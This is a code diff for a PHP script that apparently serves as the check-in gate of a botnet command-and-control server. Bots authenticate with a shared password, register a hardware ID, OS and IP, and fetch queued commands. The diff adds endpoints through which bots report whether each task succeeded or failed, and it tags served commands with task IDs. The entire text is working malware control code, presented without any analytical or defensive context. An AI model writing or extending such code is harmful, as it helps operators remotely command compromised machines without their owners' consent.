@@ -17,6 +17,16 @@ if ($_GET && isset($_GET['err']) && isset($_GET['os'])&& isset($_GET['pwd']) && 
 	db_query("INSERT INTO `error`(`os`, `err`) VALUES(:1, :2)", $_GET['os'], nl2br(htmlentities($_GET['err'])));
 	die('Error stored');
 }
+elseif ($_GET && isset($_GET['success']) && isset($_GET['pwd']) && $_GET['pwd'] == $GLOBALS['bot_pass'])
+{
+	db_query("UPDATE `sentTasks` SET `status` = 1 WHERE `tid` = :1", $_GET['success']);
+	die('Task updated');
+}
+elseif ($_GET && isset($_GET['failor']) && isset($_GET['pwd']) && $_GET['pwd'] == $GLOBALS['bot_pass'])
+{
+	db_query("UPDATE `sentTasks` SET `status` = -1 WHERE `tid` = :1", $_GET['failor']);
+	die('Task updated');
+}
 elseif ($_GET && isset($_GET['hwid']) && isset($_GET['os']) && isset($_GET['pwd']) && $_GET['pwd'] == $GLOBALS['bot_pass'])
 {
 	$ip = (empty($_SERVER['HTTP_X_FORWARDED_FOR']) ? (empty($_SERVER['HTTP_CLIENT_IP']) ? $_SERVER['REMOTE_ADDR'] : $_SERVER['HTTP_CLIENT_IP']) : $_SERVER['HTTP_X_FORWARDED_FOR']);
@@ -59,7 +69,7 @@ elseif ($_GET && isset($_GET['hwid']) && isset($_GET['os']) && isset($_GET['pwd'
 		$row = $stmt->fetch();
 		db_query("UPDATE `tasks` SET `received` = `received` + 1 WHERE `id` = :1", $row['id']);
 		db_query("INSERT INTO `sentTasks`(`tid`, `hwid`) VALUES(:1, :2)", $row['id'], $_GET['hwid']);
-		echo $row['command'];
+		echo $row['id'].'|'.$row['command'];
 	}
 }
 ?>
